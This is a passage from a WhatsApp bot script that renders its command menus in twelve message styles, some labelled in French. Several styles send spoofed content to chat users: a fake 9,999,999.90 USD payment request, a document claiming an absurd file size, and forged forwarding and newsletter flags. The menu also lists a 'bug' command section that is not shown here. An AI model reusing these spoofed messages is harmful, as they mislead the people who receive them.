│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
│𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
│𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
│𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
│𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${ktime}
│𝗗𝗮𝘁𝗲 : ${kdate}
└┬───────────────── ⳹
   │✑  Veuillez entrer*MENU*
   │✑  Given *BELOW*
┌└─────────────┈ ⳹
│❏${prefix}allmenu
│❏${prefix}searchmenu
│❏${prefix}downloadmenu
│❏${prefix}gamemenu
│❏${prefix}funmenu
│❏${prefix}aimenu
│❏${prefix}groupmenu
│❏${prefix}ownermenu
│❏${prefix}convertmenu
│❏${prefix}listmenu
│❏${prefix}religionmenu
│❏${prefix}animemenu
│❏${prefix}nsfwmenu
│❏${prefix}randomphotomenu
│❏${prefix}randomvideomenu
│❏${prefix}stickermenu
│❏${prefix}databasemenu
│❏${prefix}storemenu
│❏${prefix}stalkermenu
│❏${prefix}bugmenu
│❏${prefix}othermenu
└─────────────────┈ ⳹'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"toutmenu 🗂️","id":"${prefix}tout_menu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh2
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher tout le menu",
"id":"${prefix}tout_menu"},
{"header":"MENU DE RECHERCHE",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de recherche",
"id":"${prefix}menu_recherche"},
{"header":"MENU TELECHARGEMENT",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de telechargement",
"id":"${prefix}menu_telechargement"},
{"header":"MENU GAME",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de jeux",
"id":"${prefix}menu_game"},
{"header":"MENU FUN",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de fun",
"id":"${prefix}menu_fun"},
{"header":"AI MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes ai",
"id":"${prefix}menu_ai"},
{"header":"MENU GROUPE",
"title":"cliquez pour afficher",
"description":"Afficher les commandes de groupe",
"id":"${prefix}menu_groupe"},
{"header":"MENU PROPRIO",
"title":"cliquez pour afficher",
"description":"Afficher les commandes du proprio",
"id":"${prefix}menu_proprio"},
{"header":"MENU CONVERSION",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de conversion",
"id":"${prefix}menu_conversion"},
{"header":"LISTE MENU",
"title":"cliquez pour afficher",
"description":"Afficher la liste des menus",
"id":"${prefix}liste_menu"},
{"header":"MENU -18",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes -18",
"id":"${prefix}menu-18"},
{"header":"MENU ANIME",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes d'anime",
"id":"${prefix}menu_anime"},
{"header":"MENU STICKER",
"title":"cliquez pour afficher",
"description":"afficher toutes les commandes de sticker",
"id":"${prefix}menu_sticker"},
{"header":"MENU DATABASE",
"title":"cliquez pour afficher",
"description":"afficher toutes les commandes de la database",
"id":"${prefix}menu_database"},
{"header":"MENU BUG",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes de bug",
"id":"${prefix}menu_bug"},
{"header":"AUTRE MENU",
"title":"cliquez pour afficher",
"description":"Afficher les commandes non repertoriees",
"id":"${prefix}autre_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'tout_menu': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'menu_proprio': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
